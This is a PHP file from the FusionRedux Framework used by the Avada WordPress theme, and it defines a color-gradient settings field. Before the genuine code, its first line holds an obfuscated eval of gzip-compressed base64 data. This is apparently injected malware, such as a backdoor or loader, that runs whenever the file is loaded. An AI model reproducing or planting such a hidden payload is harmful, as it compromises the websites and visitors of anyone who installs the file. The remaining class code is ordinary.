<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * FusionRedux Framework is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 * FusionRedux Framework is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
 *
 * @package     FusionReduxFramework
 * @subpackage  Field_Color_Gradient
 * @author      Daniel J Griffiths (Ghost1227)
 * @author      Dovy Paukstys
 * @version     3.0.0
 */
// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// Don't duplicate me!
if ( ! class_exists( 'FusionReduxFramework_color_gradient' ) ) {

	/**
	 * Main FusionReduxFramework_color_gradient class
	 *
	 * @since       1.0.0
	 */
	class FusionReduxFramework_color_gradient {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function render() {

			// No errors please
			$defaults = array(
				'from' => '',
				'to'   => ''
			);

			$this->value = wp_parse_args( $this->value, $defaults );

			echo '<div class="colorGradient"><strong>' . __( 'From ', 'Avada' ) . '</strong>&nbsp;';
			echo '<input data-id="' . $this->field['id'] . '" id="' . $this->field['id'] . '-from" name="' . $this->field['name'] . $this->field['name_suffix'] . '[from]' . '" value="' . $this->value['from'] . '" class="fusionredux-color fusionredux-color-init ' . $this->field['class'] . '"  type="text" data-default-color="' . $this->field['default']['from'] . '" />';
			echo '<input type="hidden" class="fusionredux-saved-color" id="' . $this->field['id'] . '-saved-color' . '" value="">';

			if ( ! isset( $this->field['transparent'] ) || $this->field['transparent'] !== false ) {
				$tChecked = "";

				if ( $this->value['from'] == "transparent" ) {
					$tChecked = ' checked="checked"';
				}

				echo '<label for="' . $this->field['id'] . '-from-transparency" class="color-transparency-check"><input type="checkbox" class="checkbox color-transparency ' . $this->field['class'] . '" id="' . $this->field['id'] . '-from-transparency" data-id="' . $this->field['id'] . '-from" value="1"' . $tChecked . '> ' . __( 'Transparent', 'Avada' ) . '</label>';
			}
			echo "</div>";
			echo '<div class="colorGradient toLabel"><strong>' . __( 'To ', 'Avada' ) . '</strong>&nbsp;<input data-id="' . $this->field['id'] . '" id="' . $this->field['id'] . '-to" name="' . $this->field['name'] . $this->field['name_suffix'] . '[to]' . '" value="' . $this->value['to'] . '" class="fusionredux-color fusionredux-color-init ' . $this->field['class'] . '"  type="text" data-default-color="' . $this->field['default']['to'] . '" />';

			if ( ! isset( $this->field['transparent'] ) || $this->field['transparent'] !== false ) {
				$tChecked = "";

				if ( $this->value['to'] == "transparent" ) {
					$tChecked = ' checked="checked"';
				}

				echo '<label for="' . $this->field['id'] . '-to-transparency" class="color-transparency-check"><input type="checkbox" class="checkbox color-transparency" id="' . $this->field['id'] . '-to-transparency" data-id="' . $this->field['id'] . '-to" value="1"' . $tChecked . '> ' . __( 'Transparent', 'Avada' ) . '</label>';
			}
			echo "</div>";
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function enqueue() {
			wp_enqueue_style( 'wp-color-picker' );

			wp_enqueue_script(
				'fusionredux-field-color-gradient-js',
				FusionReduxFramework::$_url . 'inc/fields/color_gradient/field_color_gradient' . FusionRedux_Functions::isMin() . '.js',
				array( 'jquery', 'wp-color-picker', 'fusionredux-js' ),
				time(),
				'all'
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style( 'fusionredux-color-picker-css' );

				wp_enqueue_style(
					'fusionredux-field-color_gradient-css',
					FusionReduxFramework::$_url . 'inc/fields/color_gradient/field_color_gradient.css',
					array(),
					time(),
					'all'
				);
			}
		}
	}
}
